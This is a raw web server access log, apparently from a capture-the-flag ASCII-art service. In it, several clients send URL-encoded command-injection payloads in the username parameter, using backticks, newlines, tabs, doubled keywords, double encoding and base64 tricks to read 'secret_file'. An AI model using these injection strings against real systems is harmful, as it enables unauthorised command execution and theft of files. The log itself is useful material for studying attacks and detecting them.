14.161.31.188 - - [28/Aug/2022:08:51:18 +0000] "GET /?debug HTTP/1.1" 200 2691 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:51:28 +0000] "GET / HTTP/1.1" 200 1219 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:51:40 +0000] "GET /?debug HTTP/1.1" 200 2691 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
139.180.147.96 - - [28/Aug/2022:08:51:43 +0000] "GET /index.php HTTP/1.1" 200 1423 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:51:43 +0000] "GET /demo.png HTTP/1.1" 200 103050 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
171.253.1.35 - - [28/Aug/2022:08:51:44 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%2e%2e%25%30%41%63%64%25%30%39%2e%2e%25%30%41%63%64%25%30%39%2e%2e%25%30%41%63%64%25%30%39%2e%2e%25%30%41%6c%73%25%30%39%25%36%30&type=figlet HTTP/1.1" 200 1833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:51:45 +0000] "GET / HTTP/1.1" 200 1199 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:51:45 +0000] "GET / HTTP/1.1" 200 1194 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:51:48 +0000] "GET /?debug HTTP/1.1" 200 2654 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:51:50 +0000] "GET / HTTP/1.1" 200 1135 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:51:51 +0000] "GET /index.php?username=%2525%2536%2530%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2561%2574%2525%2530%2539%2573%2565%2563%2572%2565%2574%255f%2566%2569%256c%2565%2525%2536%2530&type=figlet HTTP/1.1" 200 1752 "http://128.199.190.141:5551/index.php?username=%2F&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:51:51 +0000] "GET / HTTP/1.1" 200 1186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:08:51:52 +0000] "GET /?debug HTTP/1.1" 200 2691 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:51:53 +0000] "GET / HTTP/1.1" 200 1165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:51:55 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=figlet HTTP/1.1" 200 1783 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:51:55 +0000] "GET /demo.png HTTP/1.1" 200 103014 "http://128.199.190.141:5551/index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:51:55 +0000] "GET /style.css HTTP/1.1" 200 919 "http://128.199.190.141:5551/index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:51:58 +0000] "GET /favicon.ico HTTP/1.1" 404 459 "http://128.199.190.141:5551/index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:51:59 +0000] "GET /?debug=1 HTTP/1.1" 200 2691 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:52:02 +0000] "GET / HTTP/1.1" 200 1164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:52:02 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1098 "http://128.199.190.141:5551/index.php?username=%2525%2536%2530%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2561%2574%2525%2530%2539%2573%2565%2563%2572%2565%2574%255f%2566%2569%256c%2565%2525%2536%2530&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:52:05 +0000] "GET / HTTP/1.1" 200 1195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
171.253.1.35 - - [28/Aug/2022:08:52:05 +0000] "GET /?debug HTTP/1.1" 200 2654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:52:06 +0000] "GET /index.php?username=sadasasd&type=random HTTP/1.1" 200 1243 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:52:08 +0000] "GET /index.php?username=sadasasd&type=random HTTP/1.1" 200 1128 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:52:09 +0000] "GET /index.php HTTP/1.1" 200 1170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:52:10 +0000] "GET /index.php?debug HTTP/1.1" 200 2654 "http://128.199.190.141:5551/index.php?username=sadasasd&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:52:12 +0000] "GET /index.php?debug HTTP/1.1" 200 2654 "http://128.199.190.141:5551/index.php?username=sadasasd&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:08:52:13 +0000] "GET /index.php?username=%27ccdd%09..%0Accdd%09..%0Accdd%09..%0Accatat%09secret_fisecret_filele%0A&type=figlet HTTP/1.1" 200 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:52:14 +0000] "GET /?debug HTTP/1.1" 200 2690 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:08:52:17 +0000] "GET /?debug HTTP/1.1" 200 2691 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:20 +0000] "GET /index.php?username=%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%36%25%32%35%25%33%33%25%33%30%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%33%25%33%39%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%34%25%33%31%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%33%25%33%39%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%34%25%33%31%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%33%25%33%39%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%34%25%33%31%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%33%25%33%39%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%34%25%33%31%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%30%25%32%35%25%33%33%25%33%39%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%35%25%36%36%25%32%35%25%33%36%25%33%36%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%36%25%32%35%25%33%33%25%33%30&type=figlet HTTP/1.1" 200 2174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:20 +0000] "GET /index.php?debug HTTP/1.1" 200 2691 "http://128.199.190.141:5551/index.php?username=%27ccdd%09..%0Accdd%09..%0Accdd%09..%0Accatat%09secret_fisecret_filele%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:28 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=figlet HTTP/1.1" 200 1893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:52:33 +0000] "GET /index.php?username=%22cat+%2Fsecret_file%22+%22findstr%22+%22search%22&type=gnu HTTP/1.1" 200 1342 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=toilet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:52:33 +0000] "GET /index.php?username=2&type=eyes HTTP/1.1" 200 1164 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:34 +0000] "GET /index.php?username=PLEASEDONTHACKMEAGAIN%21&type=random HTTP/1.1" 200 1226 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:52:36 +0000] "GET /index.php?username=%23&type=random HTTP/1.1" 200 1164 "http://128.199.190.141:5551/index.php?username=2&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:37 +0000] "GET /index.php?username=PLEASEDONTHACKMEAGAIN%21&type=random HTTP/1.1" 200 1242 "http://128.199.190.141:5551/index.php?username=PLEASEDONTHACKMEAGAIN%21&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:38 +0000] "GET /index.php?username=%25%32%35%25%33%36%25%33%30%25%36%33%25%36%34%25%32%35%25%33%30%25%33%39%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%30%25%34%31%25%36%33%25%36%34%25%32%35%25%33%30%25%33%39%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%30%25%34%31%25%36%33%25%36%34%25%32%35%25%33%30%25%33%39%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%30%25%34%31%25%36%33%25%36%34%25%32%35%25%33%30%25%33%39%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%30%25%34%31%25%36%33%25%36%31%25%37%34%25%32%35%25%33%30%25%33%39%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34%25%35%66%25%36%36%25%36%39%25%36%63%25%36%35%25%32%35%25%33%36%25%33%30&type=figlet HTTP/1.1" 200 1715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:52:39 +0000] "GET /index.php?username=%40&type=random HTTP/1.1" 200 1149 "http://128.199.190.141:5551/index.php?username=%23&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:44 +0000] "GET /index.php?username=PLEASEDONTHACKMEAGAIN%21&type=figlet HTTP/1.1" 200 1410 "http://128.199.190.141:5551/index.php?username=PLEASEDONTHACKMEAGAIN%21&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:44 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:52:49 +0000] "GET /index.php HTTP/1.1" 200 1188 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:52:51 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:52:53 +0000] "GET /index.php?debug HTTP/1.1" 200 2654 "http://128.199.190.141:5551/index.php?username=%60cd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acat%09secret_file%60&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:54 +0000] "GET /index.php?username=%40&type=random HTTP/1.1" 200 1226 "http://128.199.190.141:5551/index.php?username=%23&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:52:56 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=figlet HTTP/1.1" 200 2042 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:53:03 +0000] "GET /index.php?username=%27%27%27&type=figlet HTTP/1.1" 200 1048 "http://128.199.190.141:5551/index.php?username=PLEASEDONTHACKMEAGAIN%21&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:53:08 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:53:11 +0000] "-" 408 0 "-" "-"
171.253.1.35 - - [28/Aug/2022:08:53:12 +0000] "GET /index.php?username=%60%60&type=random HTTP/1.1" 200 1175 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
139.180.147.96 - - [28/Aug/2022:08:53:13 +0000] "GET /?debug HTTP/1.1" 200 2691 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:08:53:16 +0000] "GET /index.php HTTP/1.1" 200 1251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:53:19 +0000] "GET /index.php?username=%22&type=figlet HTTP/1.1" 200 1158 "http://128.199.190.141:5551/index.php?username=%27%27%27&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:53:24 +0000] "GET /index.php?debug HTTP/1.1" 200 2691 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:53:26 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=gnu HTTP/1.1" 200 1333 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:53:27 +0000] "GET /index.php?username=%60%60&type=random HTTP/1.1" 200 1290 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
139.180.147.96 - - [28/Aug/2022:08:53:28 +0000] "GET /index.php?username=%60%00l%00s%60&type=gnu HTTP/1.1" 200 1185 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:53:38 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=figlet HTTP/1.1" 200 2068 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
139.180.147.96 - - [28/Aug/2022:08:53:38 +0000] "GET /index.php?username=%60%00l%00s%60&type=filter HTTP/1.1" 200 1183 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:53:48 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=random HTTP/1.1" 200 1201 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:53:50 +0000] "GET /index.php?username=%60cd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acat%09secret_file%60&type=gnu HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:54:01 +0000] "GET /index.php?debug HTTP/1.1" 200 2691 "http://128.199.190.141:5551/index.php?username=%22&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:54:19 +0000] "GET /index.php?username=%60%60&type=random HTTP/1.1" 200 1283 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:54:23 +0000] "GET /index.php?username=%25%36%30%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%64%25%30%39%25%32%65%25%32%65%25%30%41%63%61%74%25%30%39%73%65%63%72%65%74%5f%66%69%6c%65%25%36%30&type=gnu HTTP/1.1" 200 1334 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:54:31 +0000] "GET /index.php?username=ccatat&type=figlet HTTP/1.1" 200 1490 "http://128.199.190.141:5551/index.php?username=%22&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:54:34 +0000] "GET /index.php?debug HTTP/1.1" 200 2654 "http://128.199.190.141:5551/index.php?username=%40&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:54:35 +0000] "GET /index.php?username=YGA=&type=random HTTP/1.1" 200 1842 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:54:38 +0000] "GET /?debug=1 HTTP/1.1" 200 2691 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:54:43 +0000] "GET /? HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:54:44 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0AY2F0%0Bbase64%09secret_file%0A&type=figlet HTTP/1.1" 200 1891 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:54:55 +0000] "GET /index.php?username=`cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0AY2F0%0Bbase64%09secret_file%0A&type=figlet HTTP/1.1" 200 1971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:55:06 +0000] "GET /index.php?username=%27ccdd%09..%0Accdd%09..%0Accdd%09..%0Accatat%09secret_fisecret_filele%0A&type=figlet HTTP/1.1" 200 1097 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:55:06 +0000] "-" 408 0 "-" "-"
